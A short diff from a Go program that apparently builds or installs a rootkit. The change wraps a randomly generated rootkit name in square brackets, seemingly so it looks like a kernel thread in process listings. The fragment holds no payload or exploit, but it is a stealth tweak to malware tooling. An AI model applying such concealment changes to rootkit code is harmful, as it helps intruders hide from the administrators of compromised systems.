@@ -404,7 +404,7 @@ func main() {
 		install_headers(*kernel)
 	}
 	if *random {
-		rootkit_name = random_string(random_int(1, 10))
+		rootkit_name = "[" + random_string(random_int(1, 10)) + "]"
 	}
 	if *kernel != "local" {
 		kernel_ver = *kernel
